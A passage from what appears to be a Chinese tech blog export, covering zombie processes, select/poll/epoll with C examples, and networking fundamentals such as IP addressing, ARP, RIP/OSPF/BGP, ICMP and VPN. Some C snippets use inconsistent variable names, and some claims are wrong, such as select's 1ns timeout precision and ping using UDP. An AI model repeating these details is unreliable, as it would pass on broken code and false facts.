由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。 僵死进程一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵死进程。 僵死进程通过 ps 命令显示出来的状态为 Z。 系统所能使用的进程号是有限的，如果大量的产生僵死进程，将因为没有可用的进程号而导致系统不能产生新的进程。 要消灭系统中大量的僵死进程，只需要将其父进程杀死，此时所有的僵死进程就会变成孤儿进程，从而被 init 所收养，这样 init 就会释放所有的僵死进程所占有的资源，从而结束僵死进程。 十一、I/O 复用概念理解I/O Multiplexing 又被称为 Event Driven I/O，它可以让单个进程具有处理多个 I/O 事件的能力。 当某个 I/O 事件条件满足时，进程会收到通知。 如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时连接几万个连接，那么就需要创建相同数量的线程。并且相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。 I/O 模型 阻塞（Blocking） 非阻塞（Non-blocking） 同步（Synchronous） 异步（Asynchronous） 阻塞非阻塞是等待 I/O 完成的方式，阻塞要求用户程序停止执行，直到 I/O 完成，而非阻塞在 I/O 完成之前还可以继续执行。 同步异步是获知 I/O 完成的方式，同步需要时刻关心 I/O 是否已经完成，异步无需主动关心，在 I/O 完成时它会收到通知。 1. 同步-阻塞这是最常见的一种模型，用户程序在使用 read() 时会执行系统调用从而陷入内核，之后就被阻塞直到系统调用完成。 应该注意到，在阻塞的过程中，其他程序还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其他程序还可以执行，因此不消耗 CPU 时间，这种模型的执行效率会比较高。 2. 同步-非阻塞非阻塞意味着用户程序在执行系统调用后还可以继续执行，内核并不是马上执行完 I/O，而是以一个错误码来告知用户程序 I/O 还未完成。为了获得 I/O 完成事件，用户程序必须调用多次系统调用去询问内核，甚至是忙等，也就是在一个循环里面一直询问并等待。 由于 CPU 要处理更多的用户程序的询问，因此这种模型的效率是比较低的。 3. 异步该模式下，I/O 操作会立即返回，之后可以处理其它操作，并且在 I/O 完成时会收到一个通知，此时会中断正在处理的操作，然后继续之前的操作。 select poll epoll这三个都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。 1. select1int select (int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); fd_set 表示描述符集合； readset、writeset 和 exceptset 这三个参数指定让操作系统内核测试读、写和异常条件的描述符； timeout 参数告知内核等待所指定描述符中的任何一个就绪可花多少时间； 成功调用返回结果大于 0；出错返回结果为 -1；超时返回结果为 0。 123456789101112131415161718192021222324252627282930313233343536fd_set fd_in, fd_out;struct timeval tv;// Reset the setsFD_ZERO( &amp;fd_in );FD_ZERO( &amp;fd_out );// Monitor sock1 for input eventsFD_SET( sock1, &amp;fd_in );// Monitor sock2 for output eventsFD_SET( sock2, &amp;fd_out );// Find out which socket has the largest numeric value as select requires itint largest_sock = sock1 &gt; sock2 ? sock1 : sock2;// Wait up to 10 secondstv.tv_sec = 10;tv.tv_usec = 0;// Call the selectint ret = select( largest_sock + 1, &amp;fd_in, &amp;fd_out, NULL, &amp;tv );// Check if select actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; if ( FD_ISSET( sock1, &amp;fd_in ) ) // input event on sock1 if ( FD_ISSET( sock2, &amp;fd_out ) ) // output event on sock2&#125; 每次调用 select() 都需要将 fd_set *readfds, fd_set *writefds, fd_set *exceptfds 链表内容全部从用户进程内存中复制到操作系统内核中，内核需要将所有 fd_set 遍历一遍，这个过程非常低效。 返回结果中内核并没有声明哪些 fd_set 已经准备好了，所以如果返回值大于 0 时，程序需要遍历所有的 fd_set 判断哪个 I/O 已经准备好。 在 Linux 中 select 最多支持 1024 个 fd_set 同时轮询，其中 1024 由 Linux 内核的 FD_SETSIZE 决定。如果需要打破该限制可以修改 FD_SETSIZE，然后重新编译内核。 2. poll1int poll (struct pollfd *fds, unsigned int nfds, int timeout); 12345struct pollfd &#123; int fd; //文件描述符 short events; //监视的请求事件 short revents; //已发生的事件&#125;; 1234567891011121314151617181920212223242526272829// The structure for two eventsstruct pollfd fds[2];// Monitor sock1 for inputfds[0].fd = sock1;fds[0].events = POLLIN;// Monitor sock2 for outputfds[1].fd = sock2;fds[1].events = POLLOUT;// Wait 10 secondsint ret = poll( &amp;fds, 2, 10000 );// Check if poll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // If we detect the event, zero it out so we can reuse the structure if ( pfd[0].revents &amp; POLLIN ) pfd[0].revents = 0; // input event on sock1 if ( pfd[1].revents &amp; POLLOUT ) pfd[1].revents = 0; // output event on sock2&#125; 它和 select() 功能基本相同。同样需要每次将 struct pollfd *fds 复制到内核，返回后同样需要进行轮询每一个 pollfd 是否已经 I/O 准备好。poll() 取消了 1024 个描述符数量上限，但是数量太大以后不能保证执行效率，因为复制大量内存到内核十分低效，所需时间与描述符数量成正比。poll() 在 pollfd 的重复利用上比 select() 的 fd_set 会更好。 如果在多线程下，如果一个线程对某个描述符调用了 poll() 系统调用，但是另一个线程关闭了该描述符，会导致 poll() 调用结果不确定，该问题同样出现在 select() 中。 3. epoll123int epoll_create(int size);int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.// The function argument is ignored (it was not before, but now it is), so put your favorite number hereint pollingfd = epoll_create( 0xCAFE );if ( pollingfd &lt; 0 ) // report error// Initialize the epoll structure in case more members are added in futurestruct epoll_event ev = &#123; 0 &#125;;// Associate the connection class instance with the event. You can associate anything// you want, epoll does not use this information. We store a connection class pointer, pConnection1ev.data.ptr = pConnection1;// Monitor for input, and do not automatically rearm the descriptor after the eventev.events = EPOLLIN | EPOLLONESHOT;// Add the descriptor into the monitoring list. We can do it even if another thread is// waiting in epoll_wait - the descriptor will be properly addedif ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-&gt;getSocket(), &amp;ev ) != 0 ) // report error// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)struct epoll_event pevents[ 20 ];// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event arrayint ready = epoll_wait( pollingfd, pevents, 20, 10000 );// Check if epoll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // Check if any events detected for ( int i = 0; i &lt; ret; i++ ) &#123; if ( pevents[i].events &amp; EPOLLIN ) &#123; // Get back our connection pointer Connection * c = (Connection*) pevents[i].data.ptr; c-&gt;handleReadEvent(); &#125; &#125;&#125; epoll 仅仅适用于 Linux OS。 它是 select 和 poll 的增强版，更加灵活而且没有描述符限制。它将用户关心的描述符放到内核的一个事件表中，从而只需要在用户空间和内核空间拷贝一次。 select 和 poll 方式中，进程只有在调用一定的方法后，内核才对所有监视的描述符进行扫描。而 epoll 事先通过 epoll_ctl() 来注册描述符，一旦基于某个描述符就绪时，内核会采用类似 callback 的回调机制，迅速激活这个描述符，当进程调用 epoll_wait() 时便得到通知。 新版本的 epoll_create(int size) 参数 size 不起任何作用，在旧版本的 epoll 中如果描述符的数量大于 size，不保证服务质量。 epoll_ctl() 执行一次系统调用，用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理。 epoll_wait() 取出在内核中通过链表维护的 I/O 准备好的描述符，将他们从内核复制到程序中，不需要像 select/poll 对注册的所有描述符遍历一遍。 epoll 对多线程编程更有友好，同时多个线程对同一个描述符调用了 epoll_wait 也不会产生像 select/poll 的不确定情况。或者一个线程调用了 epoll_wait 另一个线程关闭了同一个描述符也不会产生不确定情况。 select 和 poll 比较1. 功能它们提供了几乎相同的功能，但是在一些细节上有所不同： select 会修改 fd_set 参数，而 poll 不会； select 默认只能监听 1024 个描述符，如果要监听更多的话，需要修改 FD_SETSIZE 之后重新编译； poll 提供了更多的事件类型。 2. 速度poll 和 select 在速度上都很慢。 它们都采取轮询的方式来找到 I/O 完成的描述符，如果描述符很多，那么速度就会很慢； select 只使用每个描述符的 3 位，而 poll 通常需要使用 64 位，因此 poll 需要复制更多的内核空间。 3. 可移植性几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。 eopll 工作模式epoll_event 有两种触发模式：LT（level trigger）和 ET（edge trigger）。 1. LT 模式当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用 epoll_wait() 时，会再次响应应用程序并通知此事件。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。 2. ET 模式当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用 epoll_wait() 时，不会再次响应应用程序并通知此事件。很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。 select poll epoll 应用场景很容易产生一种错觉认为只要用 epoll 就可以了，select poll 都是历史遗留问题，并没有什么应用场景，其实并不是这样的。 1. select 应用场景select() poll() epoll_wait() 都有一个 timeout 参数，在 select() 中 timeout 的精确度为 1ns，而 poll() 和 epoll_wait() 中则为 1ms。所以 select 更加适用于实时要求更高的场景，比如核反应堆的控制。 select 历史更加悠久，它的可移植性更好，几乎被所有主流平台所支持。 2. poll 应用场景poll 没有最大描述符数量的限制，如果平台支持应该采用 poll 且对实时性要求并不是十分严格，而不是 select。 需要同时监控小于 1000 个描述符。那么也没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。 需要监控的描述符状态变化多，而且都是非常短暂的。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。epoll 的描述符存储在内核，不容易调试。 3. epoll 应用场景程序只需要运行在 Linux 平台上，有非常大量的描述符需要同时轮询，而且这些连接最好是长连接。 4. 性能对比 epoll Scalability Web Page 参考资料 鸟哥. 鸟 哥 的 Linux 私 房 菜 基 础 篇 第 三 版[J]. 2009. Linux 平台上的软件包管理 Boost application performance using asynchronous I/O Synchronous and Asynchronous I/O.aspx) Linux IO 模式及 select、poll、epoll 详解 poll vs select vs event-based Linux 之守护进程、僵死进程与孤儿进程 Linux process states GUID Partition Table 详解 wait 和 waitpid 函数 IDE、SATA、SCSI、SAS、FC、SSD 硬盘类型介绍 Akai IB-301S SCSI Interface for S2800,S3000 Parallel ATA ADATA XPG SX900 256GB SATA 3 SSD Review – Expanded Capacity and SandForce Driven Speed Decoding UCS Invicta – Part 1 硬盘 Difference between SAS and SATA BIOS File system design case studies Programming Project #4 FILE SYSTEM DESIGN]]></content>
      <categories>
        <category>系统运维</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ops</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络基础知识]]></title>
    <url>%2Flinux_ops%2Fnetworks%2F</url>
    <content type="text"><![CDATA[一、概述 网络的网络 ISP 主机之间的通信方式 电路交换与分组交换 时延 计算机网络体系结构* 二、物理层 通信方式 带通调制 信道复用技术 三、数据链路层 信道分类 三个基本问题 局域网 PPP 协议 CSMA/CD 协议* 扩展局域网* MAC 层* 四、网络层* 网际协议 IP 概述 IP 数据报格式 IP 地址编址方式 IP 地址和 MAC 地址 地址解析协议 ARP 路由器的结构 路由器分组转发流程 路由选择协议 网际控制报文协议 ICMP 分组网间探测 PING Traceroute 虚拟专用网 VPN 网络地址转换 NAT 五、运输层* UDP 和 TCP 的特点 UDP 首部格式 TCP 首部格式 TCP 的三次握手 TCP 的四次挥手 TCP 滑动窗口 TCP 可靠传输 TCP 流量控制 TCP 拥塞控制 六、应用层* 域名系统 DNS 文件传输协议 FTP 远程终端协议 TELNET 电子邮件协议 动态主机配置协议 DHCP 点对点传输 P2P Web 页面请求过程 常用端口 参考资料 一、概述网络的网络网络把主机连接起来，而互联网是把多种不同的网络连接起来，因此互联网是网络的网络。 ISP互联网服务提供商 ISP 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。 目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。 互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。 主机之间的通信方式 客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方。 对等（P2P）：不区分客户和服务器。 电路交换与分组交换 （以上分别为：电路交换、报文交换以及分组交换） 1. 电路交换电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。 2. 报文交换报文交换用于邮局通信系统，邮局接收到一份报文之后，先存储下来，然后把相同目的地的报文一起转发到下一个目的地，这个过程就是存储转发过程。 3. 分组交换分组交换也使用了存储转发，但是转发的是分组而不是报文。把整块数据称为一个报文，由于一个报文可能很长，需要先进行切分，来满足分组能处理的大小。在每个切分的数据前面加上首部之后就成为了分组，首部包含了目的地址和源地址等控制信息。 存储转发允许在一条传输线路上传送多个主机的分组，也就是说两个用户之间的通信不需要占用端到端的线路资源。 相比于报文交换，由于分组比报文更小，因此分组交换的存储转发速度更加快速。 时延总时延 = 发送时延 + 传播时延 + 处理时延 + 排队时延 1. 发送时延主机或路由器发送数据帧所需要的时间。 其中 l 表示数据帧的长度，v 表示发送速率。 2. 传播时延电磁波在信道中传播一定的距离需要花费的时间，电磁波传播速度接近光速。 其中 l 表示信道长度，v 表示电磁波在信道上的传播速率。 3. 处理时延主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据部、进行差错检验或查找适当的路由等。 4. 排队时延分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量。 计算机网络体系结构* 1. 五层协议 应用层：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等。数据单位为报文。 运输层：提供的是进程间的通用数据传输服务。由于应用层协议很多，定义通用的运输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。 网络层：为主机之间提供数据传输服务，而运输层协议是为主机中的进程提供服务。网络层把运输层传递下来的报文段或者用户数据报封装成分组。 数据链路层：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的结点提供服务。数据链路层把网络层传来的分组封装成帧。 物理层：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。 2. 七层协议其中表示层和会话层用途如下： 表示层：数据压缩、加密以及数据描述。这使得应用程序不必担心在各台主机中表示/存储的内部格式不同的问题。 会话层：建立及管理会话。 五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。 3. 数据在各层之间的传递过程在向下的过程中，需要添加下层协议所需要的首部或者尾部，而在向上的过程中不断拆开首部和尾部。 路由器只有下面三层协议，因为路由器位于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要运输层和应用层。 4. TCP/IP 体系结构它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。 现在的 TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。 TCP/IP 协议族是一种沙漏形状，中间小两边大，IP 协议在其中占用举足轻重的地位。 二、物理层通信方式 单向通信，又称为单工通信； 双向交替通信，又称为半双工通信； 双向同时通信，又称为全双工通信。 带通调制模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。 信道复用技术1. 频分复用、时分复用频分复用的所有用户在相同的时间占用不同的频率带宽资源；时分复用的所有用户在不同的时间占用相同的频率带宽资源。 使用这两种方式进行通信，在通信的过程中用户会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。 2. 统计时分复用是对时分复用的一种改进，不固定每个用户在时分复用帧中的位置，只要有数据就集中起来组成统计时分复用帧然后发送。 3. 波分复用光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。 4. 码分复用为每个用户分配 m bit 的码片，并且所有的码片正交，对于任意两个码片 和 有 为了讨论方便，取 m=8，设码片 为 00011011。在拥有该码片的用户发送比特 1 时就发送该码片，发送比特 0 时就发送该码片的反码 11100100。 在计算时将 00011011 记作 (-1 -1 -1 +1 +1 -1 +1 +1)，可以得到 其中 为 的反码。 利用上面的式子我们知道，当接收端使用码片 对接收到的数据进行内积运算时，结果为 0 的是其它用户发送的数据，结果为 1 的是用户发送的比特 1，结果为 -1 的是用户发送的比特 0。 码分复用需要发送的数据量为原先的 m 倍。 三、数据链路层信道分类 点对点信道：一对一通信方式； 广播信道：一对多通信方式。 三个基本问题1. 封装成帧将网络层传下来的分组添加首部和尾部，用于标记帧的开始和结束。 2. 透明传输透明表示一个实际存在的事物看起来好像不存在一样。 帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符，如果出现转义字符，那么就在转义字符前面再加个转义字符，在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。 3. 差错检测目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。 局域网局域网是典型的一种广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。 可以按照网络拓扑对局域网进行分类： PPP 协议用于点对点信道中。互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。 在 PPP 的帧中： F 字段为帧的定界符 A 和 C 字段暂时没有意义 FCS 字段是使用 CRC 的检验序列 信息部分的长度不超过 1500 CSMA/CD 协议*用于广播信道中。在广播信道上，同一时间只能允许一台计算机发送数据。 CSMA/CD 表示载波监听多点接入 / 碰撞检测。 多点接入 ：说明这是总线型网络，许多计算机以多点的方式连接到总线上。 载波监听 ：每个站都必须不停地监听信道。在发送前，如果监听到信道正在使用，就必须等待。 碰撞检测 ：在发送中，如果监听到信道已有其它站正在发送数据，就表示发生了碰撞。虽然每一个站在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。 记端到端的传播时延为 τ，最先发送的站点最多经过 2τ 就可以知道是否发生了碰撞，称 2τ 为 争用期 。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用 截断二进制指数退避算法 来确定，从离散的整数集合 {0, 1, .., (2k-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为重传等待时间。 扩展局域网*1. 在物理层进行扩展使用集线器进行扩展。 集线器的主要功能是对接收到的信号进行放大，以扩大网络的传输距离。 集线器不能根据 MAC 地址进行转发，而是以广播的方式发送数据帧。 集线器是一种共享式的传输设备，意味着同一时刻只能传输一组数据帧。 2. 在链路层进行扩展最开始使用的是网桥，它收到一个帧时，根据帧的 MAC 地址，查找网桥中的地址表，确定帧转发的接口。 网桥不是共享式设备，因此性能比集线器这种共享式设备更高。 交换机的问世很快就淘汰了网桥，它实质上是一个多接口网桥，而网桥是两接口。交换机的每个接口都能直接与一个主机或者另一个交换机相连，并且一般都工作在全双工方式。 交换机具有自学习能力，学习的是交换表的内容。交换表中存储着 MAC 地址到接口的映射。下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧。主机 B 收下之后，查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 3 的映射。 3. 虚拟局域网虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息，例如下图中 (A1, A2, A3, A4) 属于一个虚拟局域网，A1 发送的广播会被 A2、A3、A4 收到，而其它站点收不到。 MAC 层*MAC 地址是 6 字节（48 位）的地址，用于唯一标识网络适配器（网卡），一台主机拥有多少个适配器就有多少个 MAC 地址，例如笔记本电脑普遍存在无线网络适配器和有线网络适配器。 在 MAC 帧中： 类型 ：标记上层使用的协议； 数据 ：长度在 46-1500 之间，如果太小则需要填充； FCS ：帧检验序列，使用的是 CRC 检验方法； 前同步码 ：只是为了计算 FCS 临时加入的，计算结束之后会丢弃。 四、网络层*网际协议 IP 概述因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。 使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。 与 IP 协议配套使用的还有三个协议： 地址解析协议 ARP（Address Resolution Protocol） 网际控制报文协议 ICMP（Internet Control Message Protocol） 网际组管理协议 IGMP（Internet Group Management Protocol） IP 数据报格式 版本 : 有 4（IPv4）和 6（IPv6）两个值； 首部长度 : 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为首部固定长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。 区分服务 : 用来获得更好的服务，一般情况下不使用。 总长度 : 包括首部长度和数据部分长度。 标识 : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。 片偏移 : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。 生存时间 ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。 协议 ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。 首部检验和 ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。 IP 地址编址方式IP 地址的编址方式经历了三个历史阶段： 分类 子网划分 无分类 1. 分类由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 主机号 &gt;} 2. 子网划分通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。注意，外部网络看不到子网的存在。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 子网号 &gt;, &lt; 主机号 &gt;} 要使用子网，必须配置子网掩码。一个 B 类地址的默认子网掩码为 255.255.0.0，如果 B 类地址的子网占两个比特，那么子网掩码为 11111111 11111111 11000000 00000000，也就是 255.255.192.0。 3. 无分类无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。 IP 地址 ::= {&lt; 网络前缀号 &gt;, &lt; 主机号 &gt;} CIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 128.14.35.7/20 表示前 20 位为网络前缀。 CIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。 一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为 构成超网 。 在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。 IP 地址和 MAC 地址网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。 地址解析协议 ARP实现由 IP 地址得到 MAC 地址。 每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。 如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到硬件地址的映射。 路由器的结构路由器从功能上可以划分为：路由选择和分组转发。 分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。 路由器分组转发流程 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。 若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付； 若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器； 若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器； 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器； 报告转发分组出错。 路由选择协议互联网使用的路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。 互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。 可以把路由选择协议划分为两大类： 内部网关协议 IGP（Interior Gateway Protocol）：在 AS 内部使用，如 RIP 和 OSPF。 外部网关协议 EGP（External Gateway Protocol）：在 AS 之间使用，如 BGP。 1. 内部网关协议 RIPRIP 是一种分布式的基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1，跳数最多为 15，超过 15 表示不可达。 RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。 距离向量算法： 对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1； 对修改后的 RIP 报文中的每一个项目，进行以下步骤： 若原来的路由表中没有目的网络 N，则把该项目添加到路由表中； 否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。 若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。 RIP 协议实现简单，开销小，但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。 2. 内部网关协议 OSPF开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。 开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。 OSPF 具有以下特点： 向本自治系统中的所有路由器发送信息，这种方法是洪泛法。 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。 只有当链路状态发生变化时，路由器才会发送信息。 所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。 3. 外部网关协议 BGPAS 之间的路由选择很困难，主要是互联网规模很大。并且各个 AS 内部使用不同的路由选择协议，就无法准确定义路径的度量。并且 AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。 BGP 只能寻找一条比较好的路由，而不是最佳路由。它采用路径向量路由选择协议。 每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。 网际控制报文协议 ICMPICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。 ICMP 报文分为差错报告报文和询问报文。 分组网间探测 PINGPING 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。 Ping 发送的 IP 数据报封装的是无法交付的 UDP 用户数据报。 TracerouteTraceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。 源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，但 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文； 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。 虚拟专用网 VPN由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。 有三个专用地址块： 10.0.0.0 ~ 10.255.255.255 172.16.0.0 ~ 172.31.255.255 192.168.0.0 ~ 192.168.255.255 VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指“好像是”，而实际上并不是，它有经过公用的互联网。 下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 10.1.0.1，目的地址是 10.2.0.3。数据报先发送到与互联网相连的路由器 R1，R1 